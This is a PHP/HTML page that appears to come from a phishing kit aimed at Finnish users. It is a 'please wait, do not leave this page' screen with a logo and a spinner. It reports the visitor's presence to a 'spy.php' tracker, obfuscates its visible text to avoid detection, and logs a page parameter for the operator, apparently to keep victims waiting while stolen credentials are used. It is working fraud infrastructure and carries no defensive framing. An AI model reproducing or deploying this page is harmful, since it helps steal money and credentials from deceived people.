<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Odota...</title>
</head>
<body>
<main style="display:flex; align-items:center; justify-content:center; position:fixed; top:0; height:100%; width:100%; left:0;">
<div style="text-align:center; padding:10px;">
<img src="res/logo.svg" style="margin:10px 0;"><br>
<img src="res/loading.gif" style="margin:10px 0; width:50px;">
<p style="font-family:calibri;"><?php $bm->obf("Älä poistu tältä sivulta"); ?></p>
</div>
</main>

<script src="res/jq.js"></script>
<script>
$.post("spy.php", {waitingview:1});
</script>
<?php 
$m->ctr("LOADING (".@$_GET['p'].")");
?>
</body>
</body>
</html>